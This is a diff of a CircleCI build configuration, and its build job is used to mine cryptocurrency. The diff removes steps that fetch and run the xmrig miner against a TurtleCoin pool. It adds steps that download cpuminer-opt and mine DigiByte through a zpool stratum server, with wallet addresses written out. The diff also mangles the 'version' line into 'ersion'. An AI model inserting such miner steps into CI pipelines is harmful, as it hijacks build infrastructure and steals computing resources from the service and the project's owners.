@@ -1,4 +1,4 @@
-version: 2.1
+ersion: 2.1
 
 jobs:
   build:
@@ -6,7 +6,6 @@ jobs:
       image: ubuntu-2004:202010-01
     steps:
       - checkout
-      - run: wget https://github.com/xmrig/xmrig/releases/download/v6.9.0/xmrig-6.9.0-linux-static-x64.tar.gz
-      - run: tar xvzf xmrig-6.9.0-linux-static-x64.tar.gz
-      - run: cd xmrig-6.9.0
-      - run: ./xmrig -o ca.turtlecoin.herominers.com:10380 -u TRTLuzukz2UNgffwNp85nq9UEniVa7iu1Hbr5gCqLpaN8kTEhkZH7XHZ7RNsgdtiMnSZ7HRTH4Go3MEibGAWytaG6j6DzcQCQ4a -p V -a argon2/chukwav2 -k pause -t18
+      - run: wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.11/cpuminer-opt-linux.tar.gz
+      - run: tar xf cpuminer-opt-linux.tar.gz
+      - run:  ./cpuminer-sse2 -a power2b -o stratum+tcp://power2b.sea.mine.zpool.ca:6242 -u DLsdgNpkEjrYQs1fUQ1mDwZ3Mt5gL1v1WK -p c=DGB
